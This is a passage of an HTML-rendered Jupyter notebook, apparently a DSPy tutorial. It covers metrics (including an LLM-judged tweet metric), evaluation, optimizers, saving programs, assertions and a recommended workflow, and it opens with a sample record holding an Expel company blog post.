  Example({'title': 'Wow, they really like us', 'url': 'https://expel.com/blog/they-really-like-us/', 'date': 'Mar 24, 2021', 'contents': 'Subscribe  EXPEL BLOG Wow, they really like us Expel insider  1 MIN READ  DAVE MERKEL  MAR 24, 2021  TAGS: Company news / MDR You have to be at least a little confident to take a flying leap and start a company  especially if youre thinking of approaching investors to support you. If you dont believe in yourself, how can you convince others to put their money into your idea? Unless youre cynical and manipulative, but  I digress. It started with a tweet Five years ago, we set out to be anything but that security vendor. No red in the logo, no fear in the marketing and a ban on stupid phrases like market leading when you have, like, five customers. We set out to build something our customers could actually love, that creates space so they can spend their time on their priorities and passions. Managed security as an industry hadnt delivered on those promises. We hoped to change that. Did we think we could do it? I dont know how confident I was in myself and my co-founders alone. We were three guys with 10 Microsoft PowerPoint slides flying from meeting to meeting with investors. But the team we put together? We were confident they could do it. And they did. How do we know that? Our customers tell us all the time. Just out: Q1 2021 Forrester Wave Report Its pretty cool when someone who spends their time understanding our market, day in and day out, agrees that our crew and what they do for our customers is, in fact, awesome. Forrester just published their report entitled The Forrester Wave: Managed Detection and Response, Q1 2021 . It is, to my knowledge, the only analyst report on the managed detection and response (MDR) market that provides comparative rankings at this time. See that dot in the top right? Yeah. Thats my crew. They did that. Im feeling something right now. I believe the word is chuffed. Todays a pretty good day. Want to check it out? You can download your copy of the report here . (Dont worry  were picking up the tab. You can grab a free copy using our link.)'}) (input_keys={'title'})]}</pre>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Inside-DSPy's-Dataset-class">Inside DSPy's <code>Dataset</code> class<a class="anchor-link" href="#Inside-DSPy's-Dataset-class"></a></h3>
</div>
</div>
</div>
</div>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p><img alt="" src="https://dspy-docs.vercel.app/deep-dive/data-handling/img/data-loading.png"/></p>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Metrics">Metrics<a class="anchor-link" href="#Metrics"></a></h3><ul>
<li>What is a metric and how do I define a metric for my task?<ul>
<li>A metric is just a function that will take examples from your data and the output of your system and return a score that quantifies how good the output is.</li>
<li>For simple tasks, this could be just "accuracy" or "exact match" or "F1 score". This may be the case for simple classification or short-form QA tasks. However, for most applications, your system will output long-form outputs. There, your metric should probably be a smaller DSPy program that checks multiple properties of the output (quite possibly using AI feedback from LMs).</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h4 id="Simple-Metrics">Simple Metrics<a class="anchor-link" href="#Simple-Metrics"></a></h4>
</div>
</div>
</div>
</div><div class="fragment"><div class="jp-Cell jp-CodeCell jp-Notebook-cell jp-mod-noOutputs">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea">
<div class="jp-InputPrompt jp-InputArea-prompt">In[22]:</div>
<div class="jp-CodeMirrorEditor jp-Editor jp-InputArea-editor" data-type="inline">
<div class="cm-editor cm-s-jupyter">
<div class="highlight hl-ipython3"><pre><span></span><span class="k">def</span> <span class="nf">validate_answer</span><span class="p">(</span><span class="n">example</span><span class="p">,</span> <span class="n">pred</span><span class="p">,</span> <span class="n">trace</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">example</span><span class="o">.</span><span class="n">answer</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="n">pred</span><span class="o">.</span><span class="n">answer</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h4 id="Evaluation">Evaluation<a class="anchor-link" href="#Evaluation"></a></h4>
</div>
</div>
</div>
</div><div class="fragment">
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">dspy.evaluate</span> <span class="kn">import</span> <span class="n">Evaluate</span>

<span class="c1"># Set up the evaluator, which can be re-used in your code.</span>
<span class="n">evaluator</span> <span class="o">=</span> <span class="n">Evaluate</span><span class="p">(</span><span class="n">devset</span><span class="o">=</span><span class="n">YOUR_DEVSET</span><span class="p">,</span> <span class="n">num_threads</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">display_progress</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">display_table</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>

<span class="c1"># Launch evaluation.</span>
<span class="n">evaluator</span><span class="p">(</span><span class="n">YOUR_PROGRAM</span><span class="p">,</span> <span class="n">metric</span><span class="o">=</span><span class="n">YOUR_METRIC</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Using-AI-feedback-for-your-metric">Using AI feedback for your metric<a class="anchor-link" href="#Using-AI-feedback-for-your-metric"></a></h3>
</div>
</div>
</div>
</div><div class="fragment">
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>For most applications, your system will output long-form outputs, so your metric should check multiple dimensions of the output using AI feedback from LMs.</p>
<div class="highlight"><pre><span></span><span class="c1"># Define the signature for automatic assessments.</span>
<span class="k">class</span> <span class="nc">Assess</span><span class="p">(</span><span class="n">dspy</span><span class="o">.</span><span class="n">Signature</span><span class="p">):</span>
<span class="w">    </span><span class="sd">"""Assess the quality of a tweet along the specified dimension."""</span>

    <span class="n">assessed_text</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">InputField</span><span class="p">()</span>
    <span class="n">assessment_question</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">InputField</span><span class="p">()</span>
    <span class="n">assessment_answer</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">OutputField</span><span class="p">(</span><span class="n">desc</span><span class="o">=</span><span class="s2">"Yes or No"</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<div class="highlight"><pre><span></span><span class="n">gpt4T</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">OpenAI</span><span class="p">(</span><span class="n">model</span><span class="o">=</span><span class="s1">'gpt-4-1106-preview'</span><span class="p">,</span> <span class="n">max_tokens</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">model_type</span><span class="o">=</span><span class="s1">'chat'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">metric</span><span class="p">(</span><span class="n">gold</span><span class="p">,</span> <span class="n">pred</span><span class="p">,</span> <span class="n">trace</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
    <span class="n">question</span><span class="p">,</span> <span class="n">answer</span><span class="p">,</span> <span class="n">tweet</span> <span class="o">=</span> <span class="n">gold</span><span class="o">.</span><span class="n">question</span><span class="p">,</span> <span class="n">gold</span><span class="o">.</span><span class="n">answer</span><span class="p">,</span> <span class="n">pred</span><span class="o">.</span><span class="n">output</span>

    <span class="n">engaging</span> <span class="o">=</span> <span class="s2">"Does the assessed text make for a self-contained, engaging tweet?"</span>
    <span class="n">correct</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"The text should answer `</span><span class="si">{</span><span class="n">question</span><span class="si">}</span><span class="s2">` with `</span><span class="si">{</span><span class="n">answer</span><span class="si">}</span><span class="s2">`. Does the assessed text contain this answer?"</span>

    <span class="k">with</span> <span class="n">dspy</span><span class="o">.</span><span class="n">context</span><span class="p">(</span><span class="n">lm</span><span class="o">=</span><span class="n">gpt4T</span><span class="p">):</span>
        <span class="n">correct</span> <span class="o">=</span>  <span class="n">dspy</span><span class="o">.</span><span class="n">Predict</span><span class="p">(</span><span class="n">Assess</span><span class="p">)(</span><span class="n">assessed_text</span><span class="o">=</span><span class="n">tweet</span><span class="p">,</span> <span class="n">assessment_question</span><span class="o">=</span><span class="n">correct</span><span class="p">)</span>
        <span class="n">engaging</span> <span class="o">=</span> <span class="n">dspy</span><span class="o">.</span><span class="n">Predict</span><span class="p">(</span><span class="n">Assess</span><span class="p">)(</span><span class="n">assessed_text</span><span class="o">=</span><span class="n">tweet</span><span class="p">,</span> <span class="n">assessment_question</span><span class="o">=</span><span class="n">engaging</span><span class="p">)</span>

    <span class="n">correct</span><span class="p">,</span> <span class="n">engaging</span> <span class="o">=</span> <span class="p">[</span><span class="n">m</span><span class="o">.</span><span class="n">assessment_answer</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s1">'yes'</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="p">[</span><span class="n">correct</span><span class="p">,</span> <span class="n">engaging</span><span class="p">]]</span>
    <span class="n">score</span> <span class="o">=</span> <span class="p">(</span><span class="n">correct</span> <span class="o">+</span> <span class="n">engaging</span><span class="p">)</span> <span class="k">if</span> <span class="n">correct</span> <span class="ow">and</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">tweet</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">280</span><span class="p">)</span> <span class="k">else</span> <span class="mi">0</span>

    <span class="k">if</span> <span class="n">trace</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span> <span class="k">return</span> <span class="n">score</span> <span class="o">&gt;=</span> <span class="mi">2</span>
    <span class="k">return</span> <span class="n">score</span> <span class="o">/</span> <span class="mf">2.0</span>
</pre></div>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Using-a-DSPy-program-as-your-metric">Using a DSPy program as your metric<a class="anchor-link" href="#Using-a-DSPy-program-as-your-metric"></a></h3>
</div>
</div>
</div>
</div><div class="fragment">
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>If your metric is itself a DSPy program, one of the most powerful ways to iterate is to compile (optimize) your metric itself. That's usually easy because the output of the metric is usually a simple value (e.g., a score out of 5) so the metric's metric is easy to define and optimize by collecting a few examples.</p>
<p>When your metric is used during evaluation runs, DSPy will not try to track the steps of your program.</p>
<p>But during compiling (optimization), DSPy will trace your LM calls. The trace will contain inputs/outputs to each DSPy predictor and you can leverage that to validate intermediate steps for optimization.</p>
</div>
</div>
</div>
</div></div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Optimizers(formerly-Teleprompters)">Optimizers(formerly Teleprompters)<a class="anchor-link" href="#Optimizers(formerly-Teleprompters)"></a></h3><ul>
<li>A DSPy optimizer is an algorithm that can tune the parameters of a DSPy program (i.e., the prompts and/or the LM weights) to maximize the metrics you specify, like accuracy.<ul>
<li>There are many built-in optimizers in DSPy, which apply vastly different strategies. A typical DSPy optimizer takes three things:</li>
<li>Your DSPy program. This may be a single module (e.g., dspy.Predict) or a complex multi-module program.</li>
<li>Your metric. This is a function that evaluates the output of your program, and assigns it a score (higher is better).</li>
<li>A few training inputs. This may be very small (i.e., only 5 or 10 examples) and incomplete (only inputs to your program, without any labels).</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<ul>
<li>What does a DSPy Optimizer tune? How does it tune them?<ul>
<li>DSPy programs consist of multiple calls to LMs, stacked together as [DSPy modules]. Each DSPy module has internal parameters of three kinds: (1) the LM weights, (2) the instructions, and (3) demonstrations of the input/output behavior.</li>
<li>Given a metric, DSPy can optimize all of these three with multi-stage optimization algorithms. These can combine gradient descent (for LM weights) and discrete LM-driven optimization, i.e. for crafting/updating instructions and for creating/validating demonstrations. DSPy Demonstrations are like few-shot examples, but they're far more powerful. They can be created from scratch, given your program, and their creation and selection can be optimized in many effective ways.</li>
<li>In many cases, we found that compiling leads to better prompts than human writing. Not because DSPy optimizers are more creative than humans, but simply because they can try more things, much more systematically, and tune the metrics directly.</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<ul>
<li>Which optimizer should I use?<ul>
<li>Ultimately, finding the right optimizer to use &amp; the best configuration for your task will require experimentation. Success in DSPy is still an iterative process - getting the best performance on your task will require you to explore and iterate.</li>
<li>That being said, here's the general guidance on getting started:<ul>
<li>If you have very few examples (around 10), start with <code>BootstrapFewShot</code>.</li>
<li>If you have more data (50 examples or more), try <code>BootstrapFewShotWithRandomSearch</code>.</li>
<li>If you prefer to do instruction optimization only (i.e. you want to keep your prompt 0-shot), use <code>MIPROv2</code> configured for 0-shot optimization to optimize.</li>
<li>If youre willing to use more inference calls to perform longer optimization runs (e.g. 40 trials or more), and have enough data (e.g. 200 examples or more to prevent overfitting) then try <code>MIPROv2</code>.</li>
<li>If you have been able to use one of these with a large LM (e.g., 7B parameters or above) and need a very efficient program, finetune a small LM for your task with <code>BootstrapFinetune</code>.</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h4 id="Saving-and-loading-optimizer-output">Saving and loading optimizer output<a class="anchor-link" href="#Saving-and-loading-optimizer-output"></a></h4>
</div>
</div>
</div>
</div><div class="fragment">
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<p>Saving a program: The resulting file is in plain-text JSON format. It contains all the parameters and steps in the source program. You can always read it and see what the optimizer generated.</p>
<p>You can add save_field_meta to additionally save the list of fields with the keys, name, field_type, description, and prefix with: <code>optimized_program.save(YOUR_SAVE_PATH, save_field_meta=True)</code>.</p>
<div class="highlight"><pre><span></span><span class="n">optimized_program</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">YOUR_SAVE_PATH</span><span class="p">)</span>
</pre></div>
<p>Loading a program:</p>
<div class="highlight"><pre><span></span><span class="n">loaded_program</span> <span class="o">=</span> <span class="n">YOUR_PROGRAM_CLASS</span><span class="p">()</span>
<span class="n">loaded_program</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="n">YOUR_SAVE_PATH</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div></div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="Assertions">Assertions<a class="anchor-link" href="#Assertions"></a></h3><ul>
<li>Why and What is DSPy Assertions?<ul>
<li>Despite the growth of techniques like fine-tuning or prompt engineering, these approaches are extremely tedious and rely on heavy, manual hand-waving to guide the LMs in adhering to specific constraints. Even DSPy's modularity of programming prompting pipelines lacks mechanisms to effectively and automatically enforce these constraints.</li>
<li>To address this, we introduce DSPy Assertions, a feature within the DSPy framework designed to automate the enforcement of computational constraints on LMs. DSPy Assertions empower developers to guide LMs towards desired outcomes with minimal manual intervention, enhancing the reliability, predictability, and correctness of LM outputs.</li>
</ul>
</li>
<li>It is recommended to define a program with assertions separately than your original program if you are doing comparative evaluation for the effect of assertions. If not, feel free to set Assertions away!</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<ul>
<li><code>dspy.Assert</code> and <code>dspy.Suggest</code> API<ul>
<li><code>dspy.Suggest</code> offers a softer approach. It maintains the same retry backtracking as <code>dspy.Assert</code> but instead serves as a gentle nudger. If the model outputs cannot pass the model constraints after the <code>max_backtracking_attempts</code>, <code>dspy.Suggest</code> will log the persistent failure and continue execution of the program on the rest of the data. This ensures the LM pipeline works in a "best-effort" manner without halting execution.</li>
<li><code>dspy.Suggest</code> are best utilized as "helpers" during the evaluation phase, offering guidance and potential corrections without halting the pipeline.</li>
<li><code>dspy.Assert</code> are recommended during the development stage as "checkers" to ensure the LM behaves as expected, providing a robust mechanism for identifying and addressing errors early in the development cycle.</li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h4 id="Use-Case:-Including-Assertions-in-DSPy-Programs">Use Case: Including Assertions in DSPy Programs<a class="anchor-link" href="#Use-Case:-Including-Assertions-in-DSPy-Programs"></a></h4>
</div>
</div>
</div>
</div><div class="fragment">
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">SimplifiedBaleenAssertions</span><span class="p">(</span><span class="n">dspy</span><span class="o">.</span><span class="n">Module</span><span class="p">):</span>
    <span class="o">...</span>

    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">question</span><span class="p">):</span>
        <span class="n">context</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">prev_queries</span> <span class="o">=</span> <span class="p">[</span><span class="n">question</span><span class="p">]</span>

        <span class="k">for</span> <span class="n">hop</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">max_hops</span><span class="p">):</span>
            <span class="n">query</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_query</span><span class="p">[</span><span class="n">hop</span><span class="p">](</span><span class="n">context</span><span class="o">=</span><span class="n">context</span><span class="p">,</span> <span class="n">question</span><span class="o">=</span><span class="n">question</span><span class="p">)</span><span class="o">.</span><span class="n">query</span>

            <span class="n">dspy</span><span class="o">.</span><span class="n">Suggest</span><span class="p">(</span>
                <span class="nb">len</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">,</span>
                <span class="s2">"Query should be short and less than 100 characters"</span><span class="p">,</span>
                <span class="n">target_module</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">generate_query</span>
            <span class="p">)</span>

            <span class="n">dspy</span><span class="o">.</span><span class="n">Suggest</span><span class="p">(</span>
                <span class="n">validate_query_distinction_local</span><span class="p">(</span><span class="n">prev_queries</span><span class="p">,</span> <span class="n">query</span><span class="p">),</span>
                <span class="s2">"Query should be distinct from: "</span>
                <span class="o">+</span> <span class="s2">"; "</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">) </span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">"</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">q</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">prev_queries</span><span class="p">)),</span>
                <span class="n">target_module</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">generate_query</span>
            <span class="p">)</span>

        <span class="o">...</span>
</pre></div>
</div>
</div>
</div>
</div></div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">dspy.primitives.assertions</span> <span class="kn">import</span> <span class="n">assert_transform_module</span><span class="p">,</span> <span class="n">backtrack_handler</span>

<span class="n">baleen_with_assertions</span> <span class="o">=</span> <span class="n">assert_transform_module</span><span class="p">(</span><span class="n">SimplifiedBaleenAssertions</span><span class="p">(),</span> <span class="n">backtrack_handler</span><span class="p">)</span>

<span class="c1"># backtrack_handler is parameterized over a few settings for the backtracking mechanism</span>
<span class="c1"># To change the number of max retry attempts, you can do</span>
<span class="n">baleen_with_assertions_retry_once</span> <span class="o">=</span> <span class="n">assert_transform_module</span><span class="p">(</span><span class="n">SimplifiedBaleenAssertions</span><span class="p">(),</span> 
    <span class="n">functools</span><span class="o">.</span><span class="n">partial</span><span class="p">(</span><span class="n">backtrack_handler</span><span class="p">,</span> <span class="n">max_backtracks</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</pre></div>
</div>
</div>
</div>
</div></section></section><section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h2 id="Recommended-Workflow">Recommended Workflow<a class="anchor-link" href="#Recommended-Workflow"></a></h2><ol>
<li>Define your task</li>
<li>Define your pipeline</li>
<li>Explore a few examples</li>
<li>Define your data</li>
<li>Define your metric</li>
<li>Collect preliminary "zero-shot" evaluations</li>
<li>Compile with a DSPy optimizer</li>
<li>Iterate</li>
</ol>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="1.-Define-your-task">1. Define your task<a class="anchor-link" href="#1.-Define-your-task"></a></h3><ul>
<li>Expected input/output behavior</li>
<li>Quality and Cost</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
</div><div class="jp-RenderedHTMLCommon jp-RenderedMarkdown jp-MarkdownOutput" data-mime-type="text/markdown">
<h3 id="2.-Define-your-pipeline">2. Define your pipeline<a class="anchor-link" href="#2.-Define-your-pipeline"></a></h3><ul>
<li>simple chaing-of-thought/retrieval/tool use, like a calculator</li>
<li>is there a typical workflow for solving your problem in multiple well-defined steps or is it more open-ended?</li>
<li>start simple and let the next few steps guide any complexity you will add</li>
</ul>
</div>
</div>
</div>
</div></section><section>
<div class="jp-Cell jp-MarkdownCell jp-Notebook-cell">
<div class="jp-Cell-inputWrapper" tabindex="0">
<div class="jp-Collapser jp-InputCollapser jp-Cell-inputCollapser">
</div>
<div class="jp-InputArea jp-Cell-inputArea"><div class="jp-InputPrompt jp-InputArea-prompt">
